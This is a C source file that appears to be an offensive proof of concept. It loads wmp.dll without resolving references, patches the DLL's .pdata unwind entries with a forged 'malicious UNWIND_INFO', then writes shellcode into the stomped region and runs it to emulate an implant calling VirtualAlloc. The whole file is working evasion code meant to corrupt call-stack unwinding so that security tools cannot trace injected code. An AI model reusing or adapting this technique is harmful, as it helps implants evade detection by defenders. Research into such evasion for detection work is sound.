#include <windows.h>
#include <stdio.h>

// All of these definitions are from CallStackSpoofer/VulcanRaven by @william-burgess
typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE, * PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset : 4;
    UNWIND_CODE UnwindCode[4]; // Altered to be 3 instead of 1 for faking stack size. Can modify as necessary
    /*  UNWIND_CODE MoreUnwindCode[((CountOfCodes + 1) & ~1) - 1];
    *   union {
    *       OPTIONAL ULONG ExceptionHandler;
    *       OPTIONAL ULONG FunctionEntry;
    *   };
    *   OPTIONAL ULONG ExceptionData[]; */
} UNWIND_INFO, * PUNWIND_INFO;

/*
* @brief Load and Patch
* @param dll_name - string of the dll to load
* @param pUi      - pointer to the UNWIND_INFO which will be used to overwrite the UNWIND_INFOs of dll_name
* @return NULL if fail, otherwise the base address of the stomped DLL
*/
PVOID LoadAndPatch( _In_ PCHAR dll_name, _In_ PUNWIND_INFO pUi) {

    // Load the DLL with DONT_RESOLVE_DLL_REFERENCES flag
    HMODULE hModule = LoadLibraryExA(dll_name, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hModule) {
        printf("Failed to load %s: %d\n", dll_name, GetLastError());
        return NULL;
    }

    // Get section information
    PIMAGE_DOS_HEADER dosHeader     = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders     = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section   = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD pdata_rva     = 0;
    DWORD pdata_size    = 0;
    DWORD rdata_rva     = 0;
    DWORD rdata_size    = 0;
    DWORD text_rva      = 0;
    DWORD text_size     = 0;
    for (INT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((PCHAR)section->Name, ".text") == 0) {
            text_rva = section->VirtualAddress;
            text_size = section->Misc.VirtualSize;
        }
        if (strcmp((PCHAR)section->Name, ".pdata") == 0) {
            pdata_rva = section->VirtualAddress;
            pdata_size = section->Misc.VirtualSize;
        }
        if (strcmp((PCHAR)section->Name, ".rdata") == 0) {
            rdata_rva = section->VirtualAddress;
            rdata_size = section->Misc.VirtualSize;
        }
        section++;
    }

    if (!pdata_rva || !pdata_size || !rdata_rva || !rdata_size || !text_rva || !text_size) {
        printf("Failed to find all the necessary section information\n");
        return NULL;
    }

    // Calculate # of RUNTIME_FUNCTIONs
    LPVOID rdata = (PBYTE)hModule + rdata_rva;
    LPVOID pdata = (PBYTE)hModule + pdata_rva;
    PRUNTIME_FUNCTION runtimeFunction = (PRUNTIME_FUNCTION)pdata;
    DWORD numFunctions = pdata_size / sizeof(RUNTIME_FUNCTION);

    printf("Found %d RUNTIME_FUNCTION entries in .pdata section of %s:\n", numFunctions, dll_name);

    // Change protection of the .pdata section to read-write (RW)
    DWORD oldProtect = 0;
    if (!VirtualProtect(rdata, rdata_size, PAGE_READWRITE, &oldProtect)) {
        printf("Failed to change protection of .rdata section.\n");
        return NULL;
    }
    if (!VirtualProtect(pdata, pdata_size, PAGE_READWRITE, &oldProtect)) {
        printf("Failed to change protection of .pdata section.\n");
        return NULL;
    }

    // Sneak the malicious UNWIND_INFO into .rdata
    // Since the DLL isn't being used by the actual process, this should be fine to do
    DWORD pUi_rva = rdata_rva;
    *(PUNWIND_INFO)((PBYTE)hModule + pUi_rva) = *pUi;
    printf("rva is 0x%x\n", pUi_rva);
    printf("our unwind info is written to 0x%p\n^", ((PBYTE)hModule + pUi_rva));

    // Overwrite all the unwind info
    PUNWIND_INFO pUnwindInfoOG = NULL;
    for (DWORD i = 0; i < numFunctions; i++) {

        // We overwrite the boundaries of every RUNTIME_FUNCTION rather than just one and nulling the others
        // Because of some search algorithm the default symbol resolver uses (its just easier this way)

        // Overwrite every RUNTIME_FUNCTION's lower boundary (in .pdata)
        runtimeFunction[i].BeginAddress = text_rva;

        // Overwrite every RUNTIME_FUNCTION's upper boundary (in .pdata). Copied alignment from austin @secidiot/realoriginal
        // Alignment just in case we are executing at the bottom  of the .text section (lol you probably forgot to check shellcode vs .text size but w/e)
        runtimeFunction[i].EndAddress   = text_rva + text_size + 0x1000 - 1 & ~(0x1000 - 1);


        // Properly overwrite the UnwindInfoAddress using the rva to our UNWIND_INFO we wrote into .rdata
        * (DWORD*)&runtimeFunction[i].UnwindInfoAddress = pUi_rva;
        
        // Overwrite the UNWIND_INFO in .rdata... may cause some sillyness;
        // We could overwrite the existing code in .rdata, but we wouldn't know if our CountOfCodes line up
        // Which could get messy
        // pUnwindInfoOG = (PUNWIND_INFO)((BYTE*)hModule + runtimeFunction[i].UnwindInfoAddress);
        // *pUnwindInfoOG = *pUi;
    }
    printf("We patched the UNWIND_INFOs and RUNTIME_FUNCTIONs!\n");

    // Cleanup
    if (!VirtualProtect(rdata, rdata_size, PAGE_READONLY, &oldProtect)) {
        printf("Failed to restore protection of .pdata section.\n");
        return NULL;
    }
    if (!VirtualProtect(pdata, pdata_size, PAGE_READONLY, &oldProtect)) {
        printf("Failed to restore protection of .pdata section.\n");
        return NULL;
    }

    return hModule;
}

int main() {

    UNWIND_INFO u = { 0 };
    UNWIND_CODE uc1 = { 0 };
    UNWIND_CODE uc2 = { 0 };
    USHORT stack_size = (USHORT) 0xffff;

    // Gamble with stack size
    //uc1.UnwindOp = UWOP_ALLOC_LARGE;
    //uc1.OpInfo = 1;
    //uc2.FrameOffset = stack_size;
    //u.CountOfCodes = 3;
    //u.UnwindCode[0] = uc1;
    //u.UnwindCode[1] = uc2;
    //u.UnwindCode[2] = uc2;
    
    // Endless stack frames
    uc1.UnwindOp = UWOP_ALLOC_LARGE;
    uc1.OpInfo = 1;
    uc2.FrameOffset = stack_size;
    u.CountOfCodes = 4;
    u.UnwindCode[0] = uc1;
    u.UnwindCode[1] = uc2;
    u.UnwindCode[2] = uc2;
    u.UnwindCode[3].UnwindOp = 11; // Literally just an invalid unwind op (> 10)

    PCHAR dll  = (PCHAR)"wmp.dll";
    PCHAR func = (PCHAR)"DllGetClassObject";

    // Set this to 0 if you want to test a stomped call from a valid function range
    // Adjust this as needed to get into an invalid range with enough space for a call instruction
    DWORD invalidFuncOffs = 0x796b30;

    PVOID p = LoadAndPatch(dll, &u);

    DWORD64 _ = 0;
    PUNWIND_HISTORY_TABLE __ = NULL;

    // Testing if the RUNTIME_FUNCTION can be resolved properly after tampering with the bounds
    printf("0x%p\n", RtlLookupFunctionEntry((DWORD64)GetProcAddress((HMODULE)p, func), &_, __));
    printf("0x%p\n", RtlLookupFunctionEntry((DWORD64)GetProcAddress((HMODULE)p, func)+invalidFuncOffs, &_, __));

    PVOID va = GetProcAddress(GetModuleHandleA("kernelbase.dll"), "VirtualAlloc");

    // our shellcode to execute from a stomped region (like an implant) -- this is to emulate a `call VirtualAlloc` (with all empty args)
    BYTE shellcode[] = {
        // prolog -- allocate stack 0x40
        0x48, 0x83, 0xec, 0x78,

        // move absolute addr into rax
        0x48, 0xB8,                            // mov rax, [address]
        (BYTE)((uintptr_t)va & 0xFF),          // address byte 0
        (BYTE)(((uintptr_t)va >> 8) & 0xFF),   // address byte 1
        (BYTE)(((uintptr_t)va >> 16) & 0xFF),  // address byte 2
        (BYTE)(((uintptr_t)va >> 24) & 0xFF),  // address byte 3
        (BYTE)(((uintptr_t)va >> 32) & 0xFF),  // address byte 4
        (BYTE)(((uintptr_t)va >> 40) & 0xFF),  // address byte 5
        (BYTE)(((uintptr_t)va >> 48) & 0xFF),  // address byte 6
        (BYTE)(((uintptr_t)va >> 56) & 0xFF),  // address byte 7
        
        // Xor arg registers
        0x48, 0x31, 0xc9, // rcx
        0x48, 0x31, 0xd2, // rdx
        0x4d, 0x31, 0xc0, // r8
        0x4d, 0x31, 0xc9, // r9

        0xFF, 0xD0,       // call rax
        
        // Additional arbitrary operation
        0x48, 0x31, 0xc9,

        // epilogue -- restore stack 0x40 and ret
        0x48, 0x83, 0xc4, 0x78,
        0xc3
    };

    // We will patch VirtualAlloc with a debugbreak so we can investigate the stack via debugger when the call from our stomped shellcode is made
    BYTE db[] = { 0xcc };
    SIZE_T ___ = 0;
    WriteProcessMemory((HANDLE)-1, (PVOID)((PBYTE)GetProcAddress((HMODULE)p, func) + invalidFuncOffs), shellcode, sizeof(shellcode), &___);
    WriteProcessMemory((HANDLE)-1, va, db, sizeof(db), &___);

    // Execute
    typedef void(*exec)();
    exec func_ptr = (exec)((PBYTE)GetProcAddress((HMODULE)p, func) + invalidFuncOffs);
    printf("Emulating a stomped call from %s!%s + 0x%x\n", dll, func, invalidFuncOffs + 26); // 26 is the offset of the call instruction from the base of the shellcode
    func_ptr();

    return 0;
}
